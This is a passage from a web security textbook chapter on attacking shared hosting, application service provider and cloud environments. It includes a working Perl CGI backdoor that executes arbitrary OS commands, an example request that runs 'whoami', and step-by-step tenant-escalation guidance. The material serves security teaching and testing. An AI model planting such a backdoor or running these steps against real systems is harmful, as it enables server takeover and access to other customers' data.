The market for ASP applications is particularly mature in the fi nancial services
industry. For example, a given country may have thousands of small retailers
that want to offer their customers in-store payment cards and credit facilities.
These retailers outsource this function to dozens of different credit card provid-
ers, many of whom are themselves start-ups rather than long-established banks.
These credit card providers offer a commoditized service in which cost is the
main discriminator. Accordingly, many of them use an ASP to deliver the web
application that is provided to end users. Within each ASP, the same application
therefore is customized for a huge number of different retailers.
Figure 17-5 illustrates the typical organization and division of responsibilities
in this kind of arrangement. As you can see from the numerous agents and tasks
involved, this setup involves the same kinds of security problems as the basic shared
hosting model; however, the issues involved may be more complex. Furthermore,
additional problems are specifi c to this arrangement, as described in the next section.
Host and maintain infrastructure,
develop core application, provide
Application Service updates and support
Provider (ASP)
Customize core
functionality according to
their business offering
Credit card companies
Customize application
skin and non-functional
content
High street retailers
Use applications to
access statements
& make payments
End users
Figure 17-5: The organization of a typical application service provider
Attacking Shared Environments
Shared hosting and ASP environments introduce a range of new potential
vulnerabilities by which an attacker can target one or more applications within
the shared infrastructure.
Attacks Against Access Mechanisms
Because various external organizations have a legitimate need to update and
customize the different applications in a shared environment, the provider
cc1177..iinndddd 665588 88//1199//22001111 1122::1177::1166 PPMM
Stuttard c17.indd V2 - 08/10/2011 Page 659
Chapter 17 n Attacking Application Architecture 659
needs to implement mechanisms by which this remote access can be achieved.
In the simplest case of a virtually hosted web site, this may merely involve an
upload facility such as FTP or SCP, via which customers can write fi les within
their own web root.
If the hosting arrangement includes provision of a database, customers may
need to obtain direct access to confi gure their own database setup and retrieve
data that the application has stored. In this situation, providers may implement
a web interface to certain database administrative functions or may even expose
the actual database service on the Internet, allowing customers to connect
directly and use their own tools.
In full-blown ASP environments, where different types of customers need to
perform different levels of customization on elements of the shared application,
providers often implement highly functional applications that customers can
use for these tasks. These are often accessed via a virtual private network (VPN)
or a dedicated private connection into the ASP’s infrastructure.
Given the range of remote access mechanisms that may exist, a number of
different attacks may be possible against a shared environment:
n The remote access mechanism itself may be insecure. For example, the
FTP protocol is unencrypted, enabling a suitably positioned attacker (for
example, within a customer’s own ISP) to capture login credentials. Access
mechanisms may also contain unpatched software vulnerabilities or con-
fi guration defects that enable an anonymous attacker to compromise the
mechanism and interfere with customers’ applications and data.
n The access granted by the remote access mechanism may be overly liberal
or poorly segregated between customers. For example, customers may be
given a command shell when they require only fi le access. Alternatively,
customers may not be restricted to their own directories and may be able
to update other customers’ content or access sensitive fi les on the server
operating system.
n The same considerations apply to databases as for fi lesystem access. The
database may not be properly segregated, with different instances for
each customer. Direct database connections may use unencrypted chan-
nels such as standard ODBC.
n When a customized application is deployed for the purpose of remote access
(for example, by an ASP), this application must take on the responsibility
of controlling different customers’ access to the shared application. Any
vulnerabilities within the administrative application may allow a malicious
customer or even an anonymous user to interfere with the applications of
other customers. They may also allow customers with the limited capa-
bility to update their application’s skin to escalate privileges and modify
elements of the core functionality involved in their application to their
cc1177..iinndddd 665599 88//1199//22001111 1122::1177::1177 PPMM
Stuttard c17.indd V2 - 08/10/2011 Page 660
660 Chapter 17 n Attacking Application Architecture
advantage. Where this kind of administrative application is deployed,
any kind of vulnerability within this application may provide a vehicle
to attack the shared application accessed by end users.
Attacks Between Applications
In a shared hosting environment, different customers typically have a legitimate
need to upload and execute arbitrary scripts on the server. This immediately
raises problems that do not exist in single-hosted applications.
Deliberate Backdoors
In the most obvious kind of attack, a malicious customer may upload content
that attacks the server itself or other customers’ applications. For example, con-
sider the following Perl script, which implements a remote command facility
on the server:
#!/usr/bin/perl
use strict;
use CGI qw(:standard escapeHTML);
print header, start_html(“”);
if (param()){my $command = param(“cmd”);
$command=`$command`;
print “$command\n”;}
else {print start_form(); textfield(“command”);}
print end_html;
Accessing this script over the Internet enables the customer to execute arbi-
trary operating system commands on the server:
GET /scripts/backdoor.pl?cmd=whoami HTTP/1.1
Host: wahh-maliciousapp.com
HTTP/1.1 200 OK
Date: Sun, 03 Jul 2011 19:16:38 GMT
Server: Apache/2.0.59
Connection: close
Content-Type: text/html; charset=ISO-8859-1
Untitled Document
cc1177..iinndddd 666600 88//1199//22001111 1122::1177::1177 PPMM
Stuttard c17.indd V2 - 08/10/2011 Page 661
Chapter 17 n Attacking Application Architecture 661
apache
Because the malicious customer’s commands are executing as the Apache
user, it is likely that this will allow access to the scripts and data belonging to
other customers of the shared hosting service.
This kind of threat also exists in the context of an ASP-managed shared appli-
cation. Although the core application functionality is owned and updated by
the ASP, individual customers typically can modify this functionality in certain
defi ned ways. A malicious customer may introduce subtle backdoors into code
that he controls, enabling him to compromise the shared application and gain
access to other customers’ data.
TIP Backdoor scripts can be created in most web scripting languages. For
more examples of scripts in other languages, see http://net-square.com/
papers/one_way/one_way.html#4.0.
Attacks Between Vulnerable Applications
Even if all customers in a shared environment are benign, and upload only
legitimate scripts that are validated by the environment’s owner, attacks between
applications will, of course, be possible if vulnerabilities unwittingly exist within
the applications of individual customers. In this situation, one vulnerability
within a single application may enable a malicious user to compromise both
that application and all others hosted within the shared environment. Many
types of common vulnerability fall into this category. For example:
n A SQL injection fl aw in one application may enable an attacker to per-
form arbitrary SQL queries on the shared database. If database access is
inadequately segregated between different customers, an attacker may
be able to read and modify the data used by all applications.
n A path traversal vulnerability in one application may enable an attacker
to read or write arbitrary fi les anywhere on the server fi lesystem, includ-
ing those belonging to other applications.
n A command injection fl aw in one application may enable an attacker to
compromise the server and, therefore, the other applications hosted on
it, in the same way as described for a malicious customer.
Attacks Between ASP Application Components
The possible attacks described previously may all arise in the context of a
shared ASP application. Because customers typically can perform their own
cc1177..iinndddd 666611 88//1199//22001111 1122::1177::1177 PPMM
Stuttard c17.indd V2 - 08/10/2011 Page 662
662 Chapter 17 n Attacking Application Architecture
customizations to core application functionality, a vulnerability introduced by
one customer may enable users of a customized application to attack the main
shared application, thereby compromising the data of all the ASP’s customers.
In addition to these attacks, the ASP scenario introduces further possibilities
for malicious customers or users to compromise the wider shared application,
because of how different components of the shared application must interoper-
ate. For example:
n Data generated by different applications is often collated in a common
location and viewed by ASP-level users with powerful privileges within
the shared application. This means that an XSS-type attack within a cus-
tomized application may result in compromise of the shared application.
For example, if an attacker can inject JavaScript code into log fi le entries,
payment records, or personal contact information, this may enable him
to hijack the session of an ASP-level user and therefore gain access to
sensitive administrative functionality.
n ASPs often employ a shared database to hold data belonging to all cus-
tomers. Strict segregation of data access may or may not be enforced at
the application and database layers. However, in either case some shared
components typically exist, such as database stored procedures, that are
responsible for processing data belonging to multiple customers. Defective
trust relationships or vulnerabilities within these components may allow
malicious customers or users to gain access to data in other applications.
For example, a SQL injection vulnerability in a shared stored procedure
that runs with defi ner privileges may result in the compromise of the
entire shared database.
HACK STEPS
1. Examine the access mechanisms provided for customers of the shared
environment to update and manage their content and functionality.
Consider questions such as the following:
n Does the remote access facility use a secure protocol and suitably
hardened infrastructure?
n Can customers access files, data, and other resources that they do not
legitimately need to access?
n Can customers gain an interactive shell within the hosting environ-
ment and perform arbitrary commands?
2. If a proprietary application is used to allow customers to configure and
customize a shared environment, consider targeting this application as a
means of compromising the environment itself and individual applications
running within it.
cc1177..iinndddd 666622 88//1199//22001111 1122::1177::1177 PPMM
Stuttard c17.indd V2 - 08/10/2011 Page 663
Chapter 17 n Attacking Application Architecture 663
3. If you can achieve command execution, SQL injection, or arbitrary file
access within one application, investigate carefully whether this provides
any means of escalating your attack to target other applications.
4. If you are attacking an ASP-hosted application that is made up of both
shared and customized components, identify any shared components
such as logging mechanisms, administrative functions, and database code
components. Attempt to leverage these to compromise the shared portion
of the application and thereby attack other individual applications.
5. If a common database is used within any kind of shared environment,
perform a comprehensive audit of the database configuration, patch level,
table structure, and permissions, perhaps using a database scanning tool
such as NGSSquirrel. Any defects within the database security model may
provide a means of escalating an attack from within one application to
another.
Attacking the Cloud
The ubiquitous buzzword “cloud” refers roughly to the increased outsourcing
of applications, servers, databases, and hardware to external service providers.
It also refers to the high degree of virtualization employed in today’s shared
hosting environments.
Cloud services broadly describes on-demand Internet-based services that
provide an API, application, or web interface for consumer interaction. The
cloud computing provider normally stores user data or processes business logic
to provide the service. From an end-user perspective, traditional desktop appli-
cations are migrating to cloud-based equivalents, and businesses can replace
entire servers with on-demand equivalents.
A frequently mentioned security concern in moving to cloud services is loss
of control. Unlike with traditional server or desktop software, there is no way
for a consumer to proactively assess the security of a particular cloud service.
Yet the consumer is required to hand over all responsibility for the service
and data to a third party. For businesses, more control is being ceded to an
environment where the risks are not fully qualifi ed or quantifi ed. Published
vulnerabilities in the web applications supporting cloud services are also not
widespread, because the web-based platform is not open to the same scrutiny
as traditional client/server downloadable products.
This concern about loss of control is similar to existing concerns that busi-
nesses may have about choosing a hosting provider, or that consumers may
have about choosing a web mail provider. But this issue alone does not refl ect
the raised stakes that cloud computing brings. Whereas compromising a single
conventional web application could affect thousands of individual users, com-
promising a cloud service could affect thousands of cloud subscribers, all with
cc1177..iinndddd 666633 88//1199//22001111 1122::1177::1177 PPMM
Stuttard c17.indd V2 - 08/10/2011 Page 664
664 Chapter 17 n Attacking Application Architecture
customer bases of their own. Whereas a fl awed access control may give unau-
thorized access to a sensitive document in a work fl ow application, in a cloud
self-service application it may give unauthorized access to a server or cluster
of servers. The same vulnerability in an administrative back-end portal could
give access to entire company infrastructures.
Cloud Security from a Web Application Perspective
With a fl uid defi nition, implemented differently by every cloud provider, no
proscriptive list of vulnerabilities is applicable to all cloud architectures. It is,
however, possible to identify some key areas of vulnerabilities unique to cloud
computing architectures.
NOTE A commonly quoted defense mechanism for cloud security is the
encryption of data at rest or in transit. However, encryption may provide
minimal protection in this context. As described in the earlier section “Tiered
Architectures,” if an attacker bypasses the application’s checks for authentication
or authorization and makes a seemingly legitimate request for data, any decryp-
tion functions are automatically invoked by components lower in the stack.
Cloned Systems
Many applications rely on features of the operating system when drawing on
entropy to generate random numbers. Common sources are related to the features
of the system itself, such as system uptime, or information about the system’s
hardware. If systems are cloned, attackers possessing one of the clones could
determine the seeds used for random-number generation, which could in turn
allow more accurate predictions about the state of random-number generators.
Migration of Management Tools to the Cloud
At the heart of an enterprise cloud computing service is the interface through
which servers are provisioned and monitored. This is a self-service environ-
ment for the customer, often a web-enabled version of a tool originally used for
internal server management. Former standalone tools that have been ported to
the web often lack robust session management and access control mechanisms,
particularly where no role-based segregation existed previously. Some solutions
observed by the authors have used tokens or GUIDs for server access. Others
have simply exposed a serialization interface through which any of the manage-
ment methods could be called.
Feature-First Approach
Like most new fi elds, cloud service providers promote a feature-fi rst approach in
attracting new customers. From an enterprise perspective, cloud environments
are nearly always managed over a self-service web application. Users are given
cc1177..iinndddd 666644 88//1199//22001111 1122::1177::1177 PPMM
Stuttard c17.indd V2 - 08/10/2011 Page 665
Chapter 17 n Attacking Application Architecture 665
a wide variety of user-friendly methods by which they can access their data.
An opt-out mechanism for features generally is not offered.
Token-Based Access
Numerous cloud resources are designed to be invoked on a regular basis. This
creates the need to store a permanent authentication token on the client, decoupled
from the user’s password and used to identify a device (as opposed to a user). If
an attacker can gain access to a token, he can access the user’s cloud resources.